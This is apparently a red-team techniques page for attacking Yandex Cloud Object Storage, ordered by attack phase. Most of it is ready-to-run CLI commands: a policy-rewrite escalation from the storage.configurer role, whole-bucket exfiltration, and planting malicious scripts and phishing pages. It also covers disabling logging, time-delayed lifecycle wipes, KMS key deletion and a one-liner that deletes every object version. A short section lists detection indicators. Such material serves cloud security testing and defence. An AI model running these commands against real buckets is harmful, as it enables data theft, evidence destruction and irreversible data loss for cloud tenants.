# Yandex Cloud - Object Storage (S3) Techniques

## Service Overview

Yandex Object Storage is an S3-compatible object storage service. Buckets are globally unique across all of Yandex Cloud. Access is controlled through a layered system: IAM roles (inherited from folder/cloud), bucket ACLs, bucket policies, and object ACLs — evaluated in that order. The service supports both Yandex Cloud CLI (`yc`) and AWS CLI/SDK with the endpoint `https://storage.yandexcloud.net`.

**Key Concepts:**
- **Bucket Names**: Globally unique — deleted names can be claimed by other users (takeover risk)
- **Access Evaluation Order**: IAM/Bucket ACL → Public Access → Bucket Policy → STS Policy → Object ACL
- **Authentication**: IAM tokens, static access keys (AWS SigV4), pre-signed URLs
- **Storage Classes**: `STANDARD`, `COLD` (STANDARD_IA), `ICE` (GLACIER) — ICE supports direct access unlike AWS Glacier
- **Versioning**: Cannot be fully disabled once enabled, only paused
- **Encryption**: Server-side envelope encryption via KMS (opt-in per bucket)

---

## Enumeration

### Enumerate Buckets

```bash
# List all buckets via yc CLI
yc storage bucket list

# List buckets via AWS CLI
aws s3 ls --endpoint-url https://storage.yandexcloud.net
aws s3api list-buckets --endpoint-url https://storage.yandexcloud.net
```

### Enumerate Bucket Contents

```bash
# List objects
aws s3 ls s3://<bucket> --endpoint-url https://storage.yandexcloud.net --recursive

# List with versions (shows delete markers and old versions)
aws s3api list-object-versions --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
```

### Enumerate Bucket Configuration

```bash
# Get bucket metadata
yc storage bucket get <bucket_name> --with-acl

# Check ACL
aws s3api get-bucket-acl --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check bucket policy
aws s3api get-bucket-policy --bucket <bucket> --endpoint-url https://storage.yandexcloud.net --output text

# Check CORS
aws s3api get-bucket-cors --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check versioning
aws s3api get-bucket-versioning --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check encryption
aws s3api get-bucket-encryption --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check website hosting
aws s3api get-bucket-website --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check logging
aws s3api get-bucket-logging --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check lifecycle rules
aws s3api get-bucket-lifecycle-configuration --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Check object lock
aws s3api get-object-lock-configuration --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
```

### Enumerate Public Access

```bash
# Check public access flags
yc storage bucket get <bucket_name>
# Look for: public_read, public_list, public_config_read

# Test anonymous access
curl -s "https://<bucket>.storage.yandexcloud.net/" | head -50
curl -s "https://storage.yandexcloud.net/<bucket>/" | head -50

# Test anonymous object listing (if public-list is enabled)
curl -s "https://<bucket>.storage.yandexcloud.net?list-type=2"

# Check for inherited public access from folder IAM
yc resource-manager folder list-access-bindings --id <folder_id>
# Look for subjects: system:allUsers or system:allAuthenticatedUsers
```

### Enumerate Static Website Hosting

```bash
# Website endpoint URLs
# http(s)://<bucket>.website.yandexcloud.net
# http(s)://website.yandexcloud.net/<bucket>

curl -s "https://<bucket>.website.yandexcloud.net/"
```

### API Authentication Methods

```bash
# Method 1: IAM Token
curl -H "Authorization: Bearer ${IAM_TOKEN}" \
  "https://storage.yandexcloud.net/${BUCKET}"

# Method 2: Static Key (AWS SigV4, curl 8.3.0+)
curl --user "${AWS_KEY_ID}:${AWS_SECRET_KEY}" \
  --aws-sigv4 "aws:amz:ru-central1:s3" \
  "https://storage.yandexcloud.net/${BUCKET}"

# Method 3: AWS CLI with static keys
aws configure  # Set access key, secret key, region=ru-central1
aws s3 ls --endpoint-url https://storage.yandexcloud.net
```

---

## Privilege Escalation

### storage.configurer → Data Access via Policy Manipulation

The `storage.configurer` role can modify bucket policies but **cannot read object data directly**. However, it can craft a bucket policy granting itself or anyone `s3:GetObject`:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::<bucket>",
        "arn:aws:s3:::<bucket>/*"
      ]
    }
  ]
}
```

```bash
# Apply the policy (requires storage.configurer)
yc storage bucket update --name <bucket> --policy-from-file policy.json
```

**Risk**: `storage.configurer` is intended for settings management, but can effectively escalate to full data access.

### IAM Inheritance — Folder-Level Roles Cascade to All Buckets

Roles assigned at the folder or cloud level apply to **all** buckets within that scope:

```bash
# Granting storage.viewer at the folder level gives read access to ALL buckets in the folder
yc resource-manager folder add-access-binding <folder_id> \
  --role storage.viewer \
  --subject serviceAccount:<sa_id>
```

### Public Group Misconfiguration

Assigning roles to `allAuthenticatedUsers` at the folder level gives every Yandex Cloud user access to all buckets:

```bash
# Check for this dangerous configuration
yc resource-manager folder list-access-bindings <folder_id>
# Look for: subject type "system", ID "allAuthenticatedUsers" or "allUsers"
```

---

## Data Exfiltration

### Download Bucket Contents

```bash
# Download entire bucket
aws s3 sync s3://<bucket> ./exfil/ --endpoint-url https://storage.yandexcloud.net

# Download specific objects
aws s3 cp s3://<bucket>/<key> ./exfil/ --endpoint-url https://storage.yandexcloud.net

# Download old versions of deleted objects
aws s3api get-object --bucket <bucket> --key <key> --version-id <version_id> \
  --endpoint-url https://storage.yandexcloud.net output.file
```

### Recover Deleted Objects via Versioning

If versioning is enabled, deleted objects persist as delete markers. Previous versions remain accessible:

```bash
# List all versions including delete markers
aws s3api list-object-versions --bucket <bucket> --endpoint-url https://storage.yandexcloud.net

# Download a specific old version
aws s3api get-object --bucket <bucket> --key <key> --version-id <version_id> \
  --endpoint-url https://storage.yandexcloud.net recovered.file

# Remove delete marker to "undelete" an object
aws s3api delete-object --bucket <bucket> --key <key> --version-id <delete_marker_version_id> \
  --endpoint-url https://storage.yandexcloud.net
```

### Generate Pre-Signed URLs for Exfiltration

Pre-signed URLs allow anonymous download for up to 30 days:

```bash
# Generate a pre-signed download URL (valid up to 2,592,000 seconds = 30 days)
aws s3 presign s3://<bucket>/<key> --expires-in 2592000 \
  --endpoint-url https://storage.yandexcloud.net
```

**Note**: Pre-signed URLs expose the `access_key_id` in the URL parameters.

---

## Persistence

### Plant Backdoor Objects

Upload malicious files (scripts, web shells, malware) to buckets used by compute workloads:

```bash
# Upload objects
aws s3 cp malicious.sh s3://<bucket>/scripts/deploy.sh \
  --endpoint-url https://storage.yandexcloud.net

# Upload to a bucket serving static websites
aws s3 cp phishing.html s3://<bucket>/index.html \
  --endpoint-url https://storage.yandexcloud.net
```

### Enable Static Website Hosting for Phishing

If you have `storage.configurer` or `storage.editor`:

```bash
# Enable static hosting
aws s3api put-bucket-website --bucket <bucket> \
  --endpoint-url https://storage.yandexcloud.net \
  --website-configuration '{"IndexDocument":{"Suffix":"index.html"}}'

# The bucket is now accessible at:
# https://<bucket>.website.yandexcloud.net
```

### Bucket Name Takeover

After a bucket is deleted, its name may become available for other Yandex Cloud users. If DNS records or application configs still reference the old bucket name, an attacker can claim it:

```bash
# Create a bucket with the orphaned name
aws s3api create-bucket --bucket <target-name> \
  --endpoint-url https://storage.yandexcloud.net
```

### Modify Lifecycle Rules for Delayed Destruction

Set lifecycle rules to auto-delete objects after a period, creating a time-delayed evidence wipe:

```bash
aws s3api put-bucket-lifecycle-configuration --bucket <bucket> \
  --endpoint-url https://storage.yandexcloud.net \
  --lifecycle-configuration '{
    "Rules": [{
      "ID": "cleanup",
      "Status": "Enabled",
      "Filter": {"Prefix": ""},
      "Expiration": {"Days": 1}
    }]
  }'
```

**Key advantage**: Lifecycle deletions are **not logged** in bucket logging.

---

## Defense Evasion

### Disable Bucket Logging

```bash
# Disable logging (requires storage.configurer or higher)
aws s3api put-bucket-logging --bucket <bucket> \
  --endpoint-url https://storage.yandexcloud.net \
  --bucket-logging-status '{}'
```

### Exploit Logging Gaps

- Bucket logging is **best-effort** — not all requests are guaranteed to appear
- First log appears ~2 hours after enabling — initial activity window is unlogged
- **Lifecycle-triggered deletions are never logged**
- Logs are written once per hour — real-time detection is not possible

### Modify CORS for Covert Cross-Origin Access

```bash
# Set permissive CORS to enable browser-based exfiltration from any origin
aws s3api put-bucket-cors --bucket <bucket> \
  --endpoint-url https://storage.yandexcloud.net \
  --cors-configuration '{
    "CORSRules": [{
      "AllowedOrigins": ["*"],
      "AllowedMethods": ["GET", "PUT", "POST", "DELETE"],
      "AllowedHeaders": ["*"],
      "MaxAgeSeconds": 3600
    }]
  }'
```

---

## Impact

### Data Destruction via KMS Key Deletion

If the KMS key used for bucket encryption is deleted, **all encrypted objects become permanently inaccessible**:

```bash
# If you have kms.keys.editor on the encryption key:
yc kms symmetric-key delete <key_id>
```

### Lock Objects via WORM (Denial of Service)

Object Lock can prevent deletion or modification:

```bash
# Set legal hold (requires storage.uploader)
aws s3api put-object-legal-hold --bucket <bucket> --key <key> \
  --endpoint-url https://storage.yandexcloud.net \
  --legal-hold '{"Status": "ON"}'

# Set compliance retention (no one can override until expiry)
aws s3api put-object-retention --bucket <bucket> --key <key> \
  --endpoint-url https://storage.yandexcloud.net \
  --retention '{"Mode": "COMPLIANCE", "RetainUntilDate": "2030-01-01T00:00:00Z"}'
```

### Delete All Objects and Versions

```bash
# Delete all object versions (complete bucket wipe)
aws s3api list-object-versions --bucket <bucket> \
  --endpoint-url https://storage.yandexcloud.net --output json | \
  jq -r '.Versions[]? | "--key \(.Key) --version-id \(.VersionId)"' | \
  xargs -L1 aws s3api delete-object --bucket <bucket> \
    --endpoint-url https://storage.yandexcloud.net
```

---

## Bucket Policy Reference

### Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "rule-id",
      "Effect": "Allow|Deny",
      "Principal": "*",
      "Action": ["s3:GetObject"],
      "Resource": ["arn:aws:s3:::<bucket>/*"],
      "Condition": {}
    }
  ]
}
```

**Note**: Resource must specify **both** `arn:aws:s3:::<bucket>` (bucket-level) and `arn:aws:s3:::<bucket>/*` (object-level) for complete coverage.

### Key Condition Keys

| Condition Key | Use |
|---|---|
| `aws:sourceip` | Restrict by source IP (also checks X-Forwarded-For) |
| `aws:securetransport` | Require HTTPS |
| `aws:userid` | Restrict to specific IAM user |
| `aws:referer` | Check HTTP Referer header |
| `aws:useragent` | Check User-Agent header |
| `s3:x-amz-server-side-encryption-aws-kms-key-id` | Require specific KMS key |
| `yc:private-endpoint-id` | Restrict to VPC service connection |

---

## Key IAM Roles

| Role | What it Enables |
|---|---|
| `storage.viewer` | List buckets, read objects, view settings |
| `storage.configViewer` | View settings and object lists, but **cannot read object content** |
| `storage.configurer` | Modify policies, CORS, hosting, encryption, lifecycle, logging. **Cannot read data but can grant access via policy** |
| `storage.uploader` | Upload/overwrite objects, read objects. Cannot delete |
| `storage.editor` | Full CRUD on objects, create/delete buckets. Cannot manage ACLs or public access |
| `storage.admin` | Full control including ACLs, public access, bypass governance locks |

---

## Detection and Logging

### Bucket Logging (Opt-In)

- Not enabled by default
- Best-effort delivery (no completeness guarantee)
- Logs written hourly to a separate target bucket (must be unencrypted)
- Lifecycle actions are NOT logged
- ~2 hour delay before first log appears

### Key Fields in Access Logs

`bucket`, `handler` (e.g., `REST.GET.OBJECT`), `ip`, `method`, `object_key`, `status`, `user_agent`, `request_args`, `ssl_protocol`, `timestamp`

### Suspicious Activity Indicators

- `ListObjectVersions` calls — reconnaissance for versioned data
- `PutBucketPolicy` — policy manipulation
- `PutBucketLogging` with empty config — logging disabled
- `PutBucketLifecycleConfiguration` — evidence destruction setup
- `PutBucketWebsite` — data exposure via static hosting
- `PutBucketCors` with wildcard origin — cross-origin access enablement
- `DeleteBucketEncryption` — encryption removal

---

## References

- Object Storage Documentation: `en/storage/`
- Access Control Overview: `en/storage/security/overview.md`
- S3 API Reference: `en/storage/s3/api-ref/`
- Bucket Policy Syntax: `en/storage/security/policy.md`
- Pre-signed URLs: `en/storage/concepts/pre-signed-urls.md`
- Server Logs: `en/storage/concepts/server-logs.md`
